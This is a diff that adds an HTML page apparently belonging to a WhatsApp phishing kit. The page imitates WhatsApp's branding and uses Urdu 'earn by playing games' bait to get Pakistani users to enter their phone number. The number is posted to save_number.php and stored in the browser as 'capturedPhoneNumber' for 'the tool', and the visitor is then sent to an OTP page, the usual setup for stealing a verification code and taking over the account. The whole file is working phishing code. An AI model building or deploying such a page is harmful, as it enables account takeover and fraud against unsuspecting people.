@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter whatsapp Number</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Nastaliq+Urdu:wght@400;700&display=swap" rel="stylesheet">
+
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: 'Poppins', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #25D366, #075E54);
+            background-size: cover;
+            background-position: center;
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.9);
+            box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            width: 400px;
+        }
+
+        h1 {
+            font-size: 28px;
+            color: #333;
+        }
+
+        .input-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        select {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-right: 10px;
+            background-color: #f0f0f0;
+        }
+
+        input[type="tel"] {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .send-otp-btn {
+            background-color: #25D366;
+            color: white;
+            padding: 15px 30px;
+            font-size: 18px;
+            text-decoration: none;
+            border-radius: 50px;
+            display: inline-block;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+
+        .send-otp-btn:hover {
+            background-color: #1ebe58;
+        }
+
+        .urdu-text {
+            font-family: 'Noto Nastaliq Urdu', serif;
+            font-size: 24px;
+            color: #333;
+            margin-top: 30px;
+            font-weight: bold;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+    </style>
+
+    <script>
+        function redirectToOtp() {
+            const phoneNumber = document.getElementById("phone-number").value;
+            const countryCode = document.getElementById("country-code").value;
+
+            if (phoneNumber) {
+                // Store the phone number in local storage to retrieve it later in the tool
+                localStorage.setItem("capturedPhoneNumber", countryCode + phoneNumber);
+                window.location.href = "otp.html"; // Redirect to otp.html
+            } else {
+                alert("Please enter a valid phone number.");
+            }
+        }
+    </script>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Enter Your Phone Number</h1>
+
+        <!-- Phone number form -->
+        <!-- num_page.html -->
+<!-- num_page.html -->
+<form id="phone-form" method="POST" action="save_number.php">
+    <div class="input-group">
+        <select id="country-code" name="country-code">
+            <option value="+92">🇵🇰 +92</option>
+        </select>
+        <input type="tel" id="phone-number" name="phone-number" placeholder="Your Phone Number" required>
+    </div>
+    <button type="submit" class="send-otp-btn">Send OTP</button>
+</form>
+        <div class="urdu-text">🪙گیم کھیل کر کماو🪙</div>
+    </div>
+</body>
+</html>
